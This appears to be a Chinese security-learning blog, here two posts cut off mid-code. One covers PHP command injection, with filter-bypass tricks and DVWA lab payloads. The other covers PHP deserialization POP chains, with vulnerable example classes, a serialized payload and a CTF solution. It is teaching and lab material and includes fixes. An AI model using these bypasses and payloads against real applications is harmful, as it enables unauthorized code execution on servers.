<p><strong>常用的Linux命令总结：</strong></p>
<pre><code>ls cd mkdir rm cp mv touch cat more chmod find vi du ifconfig ping netstat lsof shutdown uname kill...</code></pre><h5 id="命令执行与代码执行的区别："><a href="#命令执行与代码执行的区别：" class="headerlink" title="命令执行与代码执行的区别："></a>命令执行与代码执行的区别：</h5><p>代码执行是通过调用<strong>服务器网站代码</strong>进行执行，而命令注入则是调用<strong>操作系统命令</strong>进行执行。</p>
<h5 id="常见的命令执行函数："><a href="#常见的命令执行函数：" class="headerlink" title="常见的命令执行函数："></a>常见的命令执行函数：</h5><ul>
<li><p><strong>system()</strong></p>
<img src="QQ截图20200121111755.png" style="zoom: 67%;" /> 



</li>
</ul>
<ul>
<li><p><strong>passthru()</strong></p>
<img src="QQ截图20200121111928.png" style="zoom: 67%;" />



</li>
</ul>
<ul>
<li><strong>exec()</strong></li>
</ul>
  <img src="QQ截图20200121112035.png" style="zoom:67%;" />



<ul>
<li><strong>shell_exec()</strong></li>
</ul>
  <img src="QQ截图20200121112153.png" style="zoom:67%;" />



<ul>
<li><strong>`反引号</strong></li>
</ul>
  <img src="QQ截图20200121112345.png" style="zoom:67%;" />



<ul>
<li><p><strong>ob_start()</strong></p>
</li>
<li><p><strong>popen()</strong></p>
</li>
<li><p><strong>proc_oprn()</strong></p>
</li>
<li><p>。。。</p>
</li>
</ul>
<h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><p><strong>1.空格过滤绕过</strong></p>
<p>空格可以用以下字符替换</p>
<pre><code>&lt;    &lt;&gt;   %20(space)   %09(tab)  $IFS$9  ${IFS}  $IFS等</code></pre><p>  测试：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200121121710.png" alt=""></p>
<p>2.<strong>命令分隔符</strong></p>
<pre><code>linux:%0a、%0d、;、&amp;、|、&amp;&amp;、||、
window: %0a、&amp;、|、%1a、</code></pre><img src="QQ截图20200121121840.png" style="zoom:67%;" />

<p><strong>%0a符号：</strong>换行符                 <strong>%0d符号：</strong>回车符             <strong><code>;</code>符号：</strong>起连续指令的功能        </p>
<p><strong>&amp;  &amp;&amp; ||的区别</strong></p>
<p>（1）&amp; 表示先执行CMD1 再执行CMD2，这里不考虑CMD1是否成功。使用CMD1 &amp; CMD2</p>
<p>（2）&amp;&amp; 表示先执行CMD1，成功后再执行CMD，否则不执行CMD2。使用CMD1 &amp;&amp; CMD2</p>
<p>（3）|| 先执行CMD1，CMD1执行成功就不再执行CMD2，CMD1执行失败则执行CMD2。使用CMD1 || CMD2</p>
<p>3.<strong>敏感字符绕过</strong></p>
<ul>
<li><p>利用变量绕过</p>
<img src="QQ截图20200121122131.png" style="zoom:67%;" />
</li>
<li><p>利用base64编码绕过</p>
<img src="QQ截图20200121122557.png" style="zoom:67%;" />



</li>
</ul>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>1.能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disable_functions中禁用</p>
<ol start="2">
<li>在进入命令执行的函数或方法之前，对参数进行过滤。</li>
<li>参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</li>
</ol>
<h4 id="DVWA-命令注入部分"><a href="#DVWA-命令注入部分" class="headerlink" title="DVWA (命令注入部分)"></a>DVWA (命令注入部分)</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h5><p>由源码可知，要求我们输入ip地址，未进行任何过滤，我们在ip地址后使用&amp;&amp;拼接想要执行的命令。</p>
<pre><code>127.0.0.1&amp;&amp;net user</code></pre><h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><pre><code>&lt;?php 
if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { 
    // Get input 
    $target = $_REQUEST[ &#39;ip&#39; ]; 
    // Set blacklist 
    $substitutions = array( 
        &#39;&amp;&amp;&#39; =&gt; &#39;&#39;, 
        &#39;;&#39;  =&gt; &#39;&#39;, 
    ); 
    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
    // Determine OS and execute the ping command. 
    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { 
        // Windows 
        $cmd = shell_exec( &#39;ping  &#39; . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); 
    } 
    // Feedback for the end user 
    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 
} 
?&gt;</code></pre><p><strong>这里把&amp;&amp;过滤了。。但是我可以使用一个&amp;来绕过。。127.0.0.1&amp;net user</strong></p>
<p><strong>当然也可以使用 ||  |效果相同</strong></p>
<h5 id="high"><a href="#high" class="headerlink" title="high:"></a>high:</h5><pre><code>&lt;?php 
if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { 
    // Get input 
    $target = trim($_REQUEST[ &#39;ip&#39; ]); 
    // Set blacklist 
    $substitutions = array( 
        &#39;&amp;&#39;  =&gt; &#39;&#39;, 
        &#39;;&#39;  =&gt; &#39;&#39;, 
        &#39;|  &#39; =&gt; &#39;&#39;, 
        &#39;-&#39;  =&gt; &#39;&#39;, 
        &#39;$&#39;  =&gt; &#39;&#39;, 
        &#39;(&#39;  =&gt; &#39;&#39;, 
        &#39;)&#39;  =&gt; &#39;&#39;, 
        &#39;`&#39;  =&gt; &#39;&#39;, 
        &#39;||&#39; =&gt; &#39;&#39;, 
    ); 
    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
    // Determine OS and execute the ping command. 
    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { 
        // Windows 
        $cmd = shell_exec( &#39;ping  &#39; . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); 
    } 
    // Feedback for the end user 
    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 
} 
?&gt; </code></pre><p>还是黑名单。。。，发现|符号还是可以使用   所以     <code>127.0.0.1| net user</code> 成功</p>
<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><h5 id="什么是代码执行漏洞？"><a href="#什么是代码执行漏洞？" class="headerlink" title="什么是代码执行漏洞？"></a>什么是代码执行漏洞？</h5><p>   当应用在调用一些能够将字符转化为代码的函数（如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。</p>
<h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p>PHP:eval()    assert()、  preg_replace() 、 call_user_func() 、  array_map() </p>
<p>Python:exec</p>
<p>asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt;</p>
<h5 id="漏洞危害：-1"><a href="#漏洞危害：-1" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul>
<li>执行代码</li>
<li>让网站写shell</li>
<li>甚至控制服务器</li>
</ul>
<h5 id="常见种类"><a href="#常见种类" class="headerlink" title="常见种类"></a>常见种类</h5><ul>
<li>代码执行函数</li>
<li>文件包含代码注入</li>
<li>正则表达代码注入</li>
<li>动态代码执行</li>
<li>其他</li>
</ul>
<h5 id="漏洞分类："><a href="#漏洞分类：" class="headerlink" title="漏洞分类："></a>漏洞分类：</h5><p>执行代码的函数：eval、assert</p>
<p>callback函数：preg_replace + /e模式</p>
<p>反序列化：unserialize()反序列化</p>
<h5 id="示例一：php-eval代码执行"><a href="#示例一：php-eval代码执行" class="headerlink" title="示例一：php eval代码执行"></a>示例一：php eval代码执行</h5><p>本地新建test.php</p>
<img src="QQ截图20200124110825.png" style="zoom:67%;" />

<p>我们本地网址执行phpinfo()</p>
<img src="QQ截图20200124111032.png" style="zoom:67%;" />



<h5 id="示例二：-eval闭合代码执行"><a href="#示例二：-eval闭合代码执行" class="headerlink" title="示例二：  eval闭合代码执行"></a>示例二：  eval闭合代码执行</h5><img src="QQ截图20200124111354.png" style="zoom: 80%;" />

<p><img src="QQ%E6%88%AA%E5%9B%BE20200124111639.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/" itemprop="url">php反序列化漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:48:16+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">web漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="反序列化漏洞学习笔记-靶场实战"><a href="#反序列化漏洞学习笔记-靶场实战" class="headerlink" title="反序列化漏洞学习笔记+靶场实战"></a>反序列化漏洞学习笔记+靶场实战</h2><h4 id="反序列化漏洞相关知识点："><a href="#反序列化漏洞相关知识点：" class="headerlink" title="反序列化漏洞相关知识点："></a>反序列化漏洞相关知识点：</h4><p><strong>（引自 i春秋网络安全学院文章）</strong></p>
<p>什么是反序列化：</p>
<p>摘自维基百科：序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。</p>
<p>概念很容易理解，其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p>
<p>序列化根据编程语言的不同分为：<strong>php反序列化，Java反序列化，python反序列化。</strong></p>
<p>在php应用中，序列化和反序列化一般用做缓存，比如<strong>seesion缓存,cookie</strong>等。</p>
<ul>
<li>序列化与反序列化与两个函数有关，分别是 <code>serialize()</code>、 <code>unserialize()</code> 这两个函数。</li>
<li>一般常用于传递 object ,object对象没法直接传值，所以需要先序列化为一段 字符串，接收方接收到后进行反序列化操作后即可得到原object对象。</li>
<li>当序列化对象时，PHP将试图在序列动作之前调用该对象的成员函数 <em>\</em>sleep() ，这就允许对象在被序列化之前 做任何清除操作。类似的，当使用 unserialize() 恢复对象之前，将调用 __wakeup() 成员函数</li>
<li>反序列化函数<code>unserialize()</code>接收一个string类型的变量，该值为已序列化后的字符串。</li>
<li>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP会自动地试图去调用 <code>__wakeup()</code> 成员函数 （如果存在的话）。</li>
</ul>
<p><strong>常见的序列化格式：</strong></p>
<ul>
<li><p>二进制</p>
</li>
<li><p>字节数组</p>
</li>
<li><p>json字符串</p>
</li>
<li><p>xml字符串</p>
<p><strong>序列化的字符串参数理解：</strong></p>
<img src="1344396-20181107131554874-1824306350.png" style="zoom:50%;" />

<p><strong>PHP序列化与反序列化</strong></p>
<p>实现函数:<strong>string serialize()</strong>和 <strong>mixed  unserialize()</strong></p>
<p>我们这里创建了一个对象，并通过serialize序列化后进行了打印；</p>
<img src="QQ截图20200114102224.png" style="zoom:67%;" />

<h5 id="魔术函数（Magic-fucntion"><a href="#魔术函数（Magic-fucntion" class="headerlink" title="魔术函数（Magic fucntion)"></a>魔术函数（Magic fucntion)</h5><p>PHP类中有一种特殊函数体的存在叫<strong>魔法函数</strong>，magic函数命名是以符号__开头的。</p>
<p>导致php出现反序列化漏洞的<strong>主要原因</strong>就是我们所调用的<strong>魔术函数</strong>：</p>
<pre><code>__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><p>利用代码测试魔术环境：</p>
<img src="QQ截图20200114005210.png" style="zoom:50%;" />

</li>
</ul>
<p>运行发现php文件发现</p>
<img src="QQ截图20200114090134.png" style="zoom:67%;" />

<p><strong><strong>_wakeup()会在unserialize()自动调用，     _</strong>destruct会在对象销毁时自动调用</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-d1181fb9a5ec18b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h4 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h4><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>PHP反序列化漏洞又称PHP对象注入，可能导致远程代码执行(RCE)，主要原因是程序的输入不当导致。</p>
<h5 id="漏洞产生的必要条件："><a href="#漏洞产生的必要条件：" class="headerlink" title="漏洞产生的必要条件："></a>漏洞产生的必要条件：</h5><p>1.unserialize函数的变量可控。（还可以结合Phar://协议）</p>
<p>2.php文件中存在可利用的类，类中有魔术方法。</p>
<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h5><p>我们在本地网站新建demo.php</p>
<img src="QQ截图20200113235252.png" style="zoom:50%;" />

<p>我们可以尝试构造一个对象，控制$test的值，达到控制数据流的目的，实现反序列化漏洞的利用</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200113235324.png" alt=""></p>
<p>在url中填入序列化好的攻击代码，即可利用成功</p>
<img src="QQ截图20200113235312.png" style="zoom:50%;" />

<h5 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h5><p>我们在本地搭建环境后，新建class.php</p>
<img src="QQ截图20200114102834.png" style="zoom: 67%;" />

<p>我们通过控制序列化字符串在本地新建一个shell.php进而打开phpinfo界面；在调用unserialize()时会通过__wakeup()把$test的写入到shell.php中。</p>
<p>效果如下：</p>
<img src="QQ截图20200114103132.png" style="zoom:50%;" />

<img src="QQ截图20200114103150.png" style="zoom: 25%;" />





<h5 id="示例3：（多次调用魔术函数）"><a href="#示例3：（多次调用魔术函数）" class="headerlink" title="示例3：（多次调用魔术函数）"></a>示例3：（多次调用魔术函数）</h5><img src="QQ截图20200114103838.png" style="zoom:67%;" />

<p>我们给test传入构造好的序列化字符串后，进行反序列化时自动调用<strong>wakeup()函数，从而在new joker()会自动调用对象joker中的</strong>construct()方法，从而把<?php phpinfo();?>写入到shell.php中：</p>
<h4 id="PHP反序列化pop链构造"><a href="#PHP反序列化pop链构造" class="headerlink" title="PHP反序列化pop链构造"></a>PHP反序列化pop链构造</h4><h5 id="POP-面向属性编程"><a href="#POP-面向属性编程" class="headerlink" title="POP:面向属性编程"></a>POP:面向属性编程</h5><p>​    面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p>
<h5 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h5><p>​    在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p>
<h5 id="POP-CHAIN"><a href="#POP-CHAIN" class="headerlink" title="POP CHAIN:"></a>POP CHAIN:</h5><p>​        把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN 。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。</p>
<p>通俗点就是：反序列化中，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Smi1e</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">safe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">safe</span>
<span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"Here is safe"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">unsafe</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>构造POP链。<br><code>protected $ClassObj = new evil();</code>是不行的，还是要通过<code>__construct</code>来实例化。<br>受保护成员变量含有<code>\0</code>和<code>*</code>需要URL编码一下。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
<span class="token keyword">class</span> <span class="token class-name">Smi1e</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">unsafe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">unsafe</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token operator">=</span><span class="token string">"phpinfo();"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Smi1e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>payload:<code>test=O%3A5%3A%22Smi1e%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A6%3A%22unsafe%22%3A1%3A%7Bs%3A12%3A%22%00unsafe%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-8e65abd0d89d46e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h5 id="phpggc："><a href="#phpggc：" class="headerlink" title="phpggc："></a>phpggc：</h5><p>收集了一些常见的PHP框架的通用反序列化的小工具链</p>
<p><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">https://github.com/ambionics/phpggc</a></p>
<p>使用方法参考此文章：</p>
<p><a href="https://xz.aliyun.com/t/5450" target="_blank" rel="noopener">从0到1掌握反序列化工具之PHPGGC</a></p>
<h5 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h5><p>首先，如果想要利用php的反序列化漏洞一般需要两个条件：</p>
<ol>
<li>unserialize()函数参数可控。(还可以结合Phar://协议)</li>
<li>魔法方法和危险函数。</li>
</ol>
<p>这两个条件都是不言而喻的，反序列化漏洞就是反序列化后魔法方法的执行，导致了魔法方法中的危险函数被执行。</p>
<p>可是我们常常会发现想要利用的危险函数并不在存在有魔法方法的类中，而此时就是要构造POP链，让没有关系的类扯上关系。</p>
<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>lemon师傅的例子：</p>
<pre><code>?php
class lemon {
    protected $ClassObj;

    function __construct() {
        $this-&gt;ClassObj = new normal();
    }

    function __destruct() {
        $this-&gt;ClassObj-&gt;action();
    }
}

class normal {
    function action() {
        echo &quot;hello&quot;;
    }
}

class evil {
    private $data;
    function action() {
        eval($this-&gt;data);
    }
}

unserialize($_GET[&#39;d&#39;]);</code></pre><p>可以看到，我们先在evil类中找到了eval危险函数，在lemon类中找到了可以利用的魔法方法<strong>destruct()，怎么利用它俩呢？首先，虽然\</strong>destruct()执行的是normal类的action，但是我们可以看到evil类也有action函数，且eval函数也在evil类的action方法中。</p>
<p>我们都知道，<strong>construct()函数是在类刚创建时执行的，这意味着即使我们将normal类替换成evil类叶柄不会影响后面的代码，而我们希望在\</strong>destruct中执行的action就变成了evil中的action。</p>
<p>生成序列化数据：</p>
<pre><code>&lt;?php
class lemon {
    protected $ClassObj;
    function __construct() {
        $this-&gt;ClassObj = new evil();
    }
}
class evil {
    private $data = &quot;phpinfo();&quot;;
}
echo urlencode(serialize(new lemon()));</code></pre><p>我们再看一个例子(2019安恒杯1月赛)：</p>
<pre><code>&lt;?php  
@error_reporting(1); 
include &#39;flag.php&#39;;
class baby 
{   
    protected $skyobj;  
    public $aaa;
    public $bbb;
    function __construct() 
    {      
        $this-&gt;skyobj = new sec;
    }  
    function __toString()      
    {          
        if (isset($this-&gt;skyobj))  
            return $this-&gt;skyobj-&gt;read();      
    }  
}  

class cool 
{    
    public $filename;     
    public $nice;
    public $amzing; 
    function read()      
    {   
        $this-&gt;nice = unserialize($this-&gt;amzing);
        $this-&gt;nice-&gt;aaa = $sth;
        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)
        {
            $file = &quot;./{$this-&gt;filename}&quot;;        
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return &quot;you must be joking!&quot;; 
            }    
        }
    }  
}  

class sec 
{  
    function read()     
    {          
        return &quot;it&#39;s so sec~~&quot;;      
    }  
}  

if (isset($_GET[&#39;data&#39;]))  
{ 
    $Input_data = unserialize($_GET[&#39;data&#39;]);
    echo $Input_data; 
} 
else 
{ 
    highlight_file(&quot;./index.php&quot;); 
} 
?&gt; </code></pre><p>这道题其实和上面一题差不多，也是在baby类中的__toString()魔法方法中借用cool类的read()函数读取文件。</p>
<p>其中这道题还有以下的限制代码</p>
<pre><code>$this-&gt;nice = unserialize($this-&gt;amzing);
$this-&gt;nice-&gt;aaa = $sth;
if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</code></pre><p><code>$sth</code>我们并不知道值，但如果我们事先将bbb的指针指向aaa，那么就一定可以成功了。</p>
<pre><code>$a = new baby();
$a-&gt;bbb = &amp;$a-&gt;aaa;
echo urlencode(serialize($a));</code></pre><h5 id="复杂一点的例子"><a href="#复杂一点的例子" class="headerlink" title="复杂一点的例子"></a>复杂一点的例子</h5><p>还是lemon师傅博客中的例子：</p>
<pre><code>&lt;?php

class OutputFilter {
  protected $matchPattern;
  protected $replacement;
  function __construct($pattern, $repl) {
    $this-&gt;matchPattern = $pattern;
    $this-&gt;replacement = $repl;
  }
  function filter($data) {
    return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);
  }
};

class LogFileFormat {
  protected $filters;
  protected $endl;
  function __construct($filters, $endl) {
    $this-&gt;filters = $filters;
    $this-&gt;endl = $endl;
  }
  function format($txt) {
    foreach ($this-&gt;filters as $filter) {
      $txt = $filter-&gt;filter($txt);
    }
    $txt = str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);
    return $txt;
  }
};

class LogWriter_File {
  protected $filename;
  protected $format;
  function __construct($filename, $format) {
    $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename));
    $this-&gt;format = $format;
  }
  function writeLog($txt) {
    $txt = $this-&gt;format-&gt;format($txt);
    //TODO: Modify the address here, and delete this TODO.
    file_put_contents(&quot;/var/log/&quot; . $this-&gt;filename, $txt, FILE_APPEND);
  }
};

class Logger {
  protected $logwriter;
  function __construct($writer) {
    $this-&gt;logwriter = $writer;
  }
  function log($txt) {
    $this-&gt;logwriter-&gt;writeLog($txt);
  }
};

class Song {
  protected $logger;
  protected $name;
  protected $group;
  protected $url;
  function __construct($name, $group, $url) {
    $this-&gt;name = $name;
    $this-&gt;group = $group;
    $this-&gt;url = $url;
    $fltr = new OutputFilter(&quot;/\[i\](.*)\[\/i\]/i&quot;, &quot;&lt;i&gt;\\1&lt;/i&gt;&quot;);
    $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\n&quot;)));
  }
  function __toString() {
    return &quot;&lt;a href=&#39;&quot; . $this-&gt;url . &quot;&#39;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group;
  }
  function log() {
    $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\n&quot;);
  }
  function get_name() {
      return $this-&gt;name;
  }
}

class Lyrics {
  protected $lyrics;
  protected $song;
  function __construct($lyrics, $song) {
    $this-&gt;song = $song;
    $this-&gt;lyrics = $lyrics;
  }
  function __toString() {
    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;
  }
  function __destruct() {
    $this-&gt;song-&gt;log();
  }
  function shortForm() {
    return &quot;&lt;p&gt;&lt;a href=&#39;song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&#39;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;;
  }
  function name_is($name) {
    return $this-&gt;song-&gt;get_name() === $name;
  }
};

class User {
  static function addLyrics($lyrics) {
    $oldlyrics = array();
    if (isset($_COOKIE[&#39;lyrics&#39;])) {
      $oldlyrics = unserialize(base64_decode($_COOKIE[&#39;lyrics&#39;]));
    }
    foreach ($lyrics as $lyric) $oldlyrics []= $lyric;
    setcookie(&#39;lyrics&#39;, base64_encode(serialize($oldlyrics)));
  }
  static function getLyrics() {
    if (isset($_COOKIE[&#39;lyrics&#39;])) {
      return unserialize(base64_decode($_COOKIE[&#39;lyrics&#39;]));
    }
    else {
      setcookie(&#39;lyrics&#39;, base64_encode(serialize(array(1, 2))));
      return array(1, 2);
    }
  }
};

class Porter {
  static function exportData($lyrics) {
    return base64_encode(serialize($lyrics));
  }
  static function importData($lyrics) {
    return serialize(base64_decode($lyrics));
  }
};

class Conn {
  protected $conn;
  function __construct($dbuser, $dbpass, $db) {
    $this-&gt;conn = mysqli_connect(&quot;localhost&quot;, $dbuser, $dbpass, $db);
  }

  function getLyrics($lyrics) {
    $r = array();
